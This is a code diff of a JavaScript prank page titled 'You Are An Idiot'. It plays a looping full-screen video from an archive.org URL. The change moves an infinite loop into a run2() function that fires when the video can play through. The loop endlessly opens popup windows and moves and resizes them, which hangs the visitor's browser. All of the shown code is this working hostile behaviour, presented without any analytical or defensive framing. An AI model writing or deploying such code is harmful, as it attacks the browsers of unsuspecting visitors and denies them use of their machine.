@@ -10,11 +10,14 @@
 		setTimeout(loop, 100);
 	}
 
+	function run2() {
+		loop();
+		while(1){var wind=window.open("about:blank",'-',"width=200","height=200");while(1){wind.moveTo(0,0);wind.resizeTo(200,200);}}
+	}
+
 	function run() {
 		document.getElementById("title").innerText = "You Are An Idiot";
-		document.getElementById("body").innerHTML = '<video id="vid" style="top:0px;position:absolute;width:100vw;height:100vh;" autoplay loop><source src="https://ia801806.us.archive.org/10/items/you-are-an-idiot-video/youare.mp4" type="video/mp4"></video>';
-		loop();
-		setTimeout(() => {while(1){var wind=window.open("about:blank",'-',"width=200","height=200");while(1){wind.moveTo(0,0);wind.resizeTo(200,200);}}}, 1000);
+		document.getElementById("body").innerHTML = '<video oncanplaythrough="run2()" id="vid" style="top:0px;position:absolute;width:100vw;height:100vh;" autoplay loop><source src="https://ia801806.us.archive.org/10/items/you-are-an-idiot-video/youare.mp4" type="video/mp4"></video>';
 	}
 </script>
 
